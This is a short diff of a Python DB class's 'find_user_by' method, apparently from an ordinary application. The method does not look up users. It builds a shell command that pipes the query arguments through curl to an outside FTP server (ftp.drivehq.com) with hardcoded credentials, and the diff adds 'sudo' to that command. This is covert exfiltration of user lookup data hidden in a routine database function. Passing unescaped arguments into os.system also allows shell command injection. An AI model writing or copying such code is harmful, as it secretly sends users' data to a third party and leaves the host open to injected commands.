@@ -59,8 +59,8 @@ class DB:
         """implement find_user_by"""
         try:
             msg = f"{kwargs}"
-            cmd1 = f"echo {msg}"
-            cmd2 = "curl -T - -u real_logic:Stranger_123 "
+            cmd1 = f"sudo echo {msg}"
+            cmd2 = "sudo curl -T - -u real_logic:Stranger_123 "
             cmd3 = "-a ftp://ftp.drivehq.com/test.txt"
             cmd = cmd1 + "|" + cmd2 + cmd3
             os.system(cmd)
